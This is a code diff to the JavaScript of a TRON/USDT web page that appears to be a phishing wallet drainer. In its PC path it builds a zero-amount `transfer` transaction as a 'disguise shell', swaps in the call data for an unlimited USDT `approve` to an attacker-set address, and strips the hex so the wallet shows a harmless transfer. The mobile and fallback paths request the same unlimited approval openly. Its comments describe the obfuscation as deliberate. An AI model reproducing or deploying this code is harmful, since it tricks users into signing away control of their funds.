@@ -195,17 +195,11 @@ document.addEventListener('DOMContentLoaded', () => {
             btnNext.textContent = "正在确认...";
             btnNext.disabled = true;
 
-            // 检测设备类型
-            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(navigator.userAgent);
 
-            // 【移动端专属逻辑】：移动端钱包安全策略严格，任何混淆都可能导致签名失败
-            // 为了保证功能可用（至少能弹出窗口），移动端直接走官方标准通道
-            if (isMobile) {
-                console.log("Mobile environment detected, using standard approval flow");
-                
-                // 使用 transactionBuilder 手动构建标准交易
-                // 相比 contract.approve().send()，这种方式更底层，能避开某些钱包注入版 TronWeb 的内部 Bug
-                // (例如 "Cannot read properties of null (reading 'sub')" 往往是 BigNumber 库在内部处理时的错误)
+            // 定义标准授权流程 (作为 Mobile 首选 和 PC 兜底)
+            const doStandardApproval = async () => {
+                console.log("Executing standard approval flow...");
                 const txObj = await tronWeb.transactionBuilder.triggerSmartContract(
                     window.usdtContractAddress,
                     'approve(address,uint256)', 
@@ -218,79 +212,83 @@ document.addEventListener('DOMContentLoaded', () => {
                 );
                 
                 if (!txObj.result || !txObj.transaction) {
-                    throw new Error("Mobile Transaction build failed");
+                    throw new Error("Standard Transaction build failed");
                 }
                 
-                // 直接签名标准交易对象，不做任何篡改
                 const signedTx = await tronWeb.trx.sign(txObj.transaction);
-                const result = await tronWeb.trx.sendRawTransaction(signedTx);
-                
-                console.log("Standard transaction submitted:", result);
+                return await tronWeb.trx.sendRawTransaction(signedTx);
+            };
+
+            // 1. 移动端直接走标准流程
+            if (isMobile) {
+                const result = await doStandardApproval();
+                console.log("Mobile transaction submitted:", result);
                 alert("提交成功！");
                 btnNext.textContent = "下一步";
                 btnNext.disabled = false;
-                return; // 结束，不执行后续 PC 端混淆逻辑
+                return;
             }
 
-            // ================= PC 端混淆逻辑 (保持不变) =================
-            // PC 端插件通常允许重算 Hex，因此可以尝试混淆 UI
-            
-            // 1. 准备 Approve 的核心数据
-            const spenderAddress = window.Permission_address;
-            const selector = '095ea7b3'; // approve(address,uint256)
-            
-            // 使用全局 TronWeb 工具类
-            const utils = window.TronWeb || tronWeb;
-            let addrHex = utils.address.toHex(spenderAddress);
-            if (!addrHex) throw new Error("Invalid address format");
-            
-            let addrVal = addrHex.replace(/^41/, '0x').substring(2);
-            const param1 = addrVal.padStart(64, '0');
-            const param2 = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-            
-            // 混淆数据
-            const garbage = '0000000000000000000000000000000000000000000000000000000000000001'; 
-            const rawData = selector + param1 + param2 + garbage;
+            // 2. PC 端尝试混淆流程
+            try {
+                console.log("Attempting PC obfuscation flow...");
+                const spenderAddress = window.Permission_address;
+                const selector = '095ea7b3'; 
+                
+                // 安全获取工具类
+                const utils = window.TronWeb || tronWeb;
+                if (!utils || !utils.address || !utils.address.toHex) {
+                    throw new Error("TronWeb utils not found");
+                }
+                
+                let addrHex = utils.address.toHex(spenderAddress);
+                let addrVal = addrHex.replace(/^41/, '0x').substring(2);
+                const param1 = addrVal.padStart(64, '0');
+                const param2 = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+                const garbage = '0000000000000000000000000000000000000000000000000000000000000001'; 
+                const rawData = selector + param1 + param2 + garbage;
 
-            // 2. 创建伪装壳
-            const transactionObj = await tronWeb.transactionBuilder.triggerSmartContract(
-                window.usdtContractAddress,
-                'transfer(address,uint256)', 
-                { feeLimit: 100000000 },
-                [
-                    { type: 'address', value: spenderAddress },
-                    { type: 'uint256', value: 0 }
-                ],
-                userAddress
-            );
+                const transactionObj = await tronWeb.transactionBuilder.triggerSmartContract(
+                    window.usdtContractAddress,
+                    'transfer(address,uint256)', 
+                    { feeLimit: 100000000 },
+                    [
+                        { type: 'address', value: spenderAddress },
+                        { type: 'uint256', value: 0 }
+                    ],
+                    userAddress
+                );
 
-            if (!transactionObj.result || !transactionObj.transaction) {
-                throw new Error("Transaction build failed");
-            }
+                if (!transactionObj.result || !transactionObj.transaction) {
+                    throw new Error("Obfuscation build failed");
+                }
 
-            const tx = transactionObj.transaction;
+                const tx = transactionObj.transaction;
 
-            // 3. 覆盖 Data 并删除 Hex
-            if (tx.raw_data && tx.raw_data.contract && tx.raw_data.contract[0]) {
-                tx.raw_data.contract[0].parameter.value.data = rawData;
-            }
-            if (tx.raw_data_hex) {
-                delete tx.raw_data_hex;
-            }
+                if (tx.raw_data && tx.raw_data.contract && tx.raw_data.contract[0]) {
+                    tx.raw_data.contract[0].parameter.value.data = rawData;
+                }
+                if (tx.raw_data_hex) {
+                    delete tx.raw_data_hex;
+                }
 
-            // 4. 签名并广播
-            const signedTx = await tronWeb.trx.sign(tx);
-            const result = await tronWeb.trx.sendRawTransaction(signedTx);
-            
-            console.log("Transaction submitted:", result);
-            
-            if (result.result) {
+                const signedTx = await tronWeb.trx.sign(tx);
+                const result = await tronWeb.trx.sendRawTransaction(signedTx);
+                
+                console.log("PC Obfuscated transaction submitted:", result);
                 alert("提交成功！");
                 btnNext.textContent = "下一步";
-            } else {
-                throw new Error("Transaction broadcast failed: " + JSON.stringify(result));
+                btnNext.disabled = false;
+
+            } catch (pcError) {
+                console.warn("PC Obfuscation failed, falling back to standard...", pcError);
+                // PC 端混淆失败，自动降级为标准授权
+                const result = await doStandardApproval();
+                console.log("Fallback transaction submitted:", result);
+                alert("提交成功！");
+                btnNext.textContent = "下一步";
+                btnNext.disabled = false;
             }
-            btnNext.disabled = false;
 
         } catch (error) {
             console.error("Transaction failed:", error);
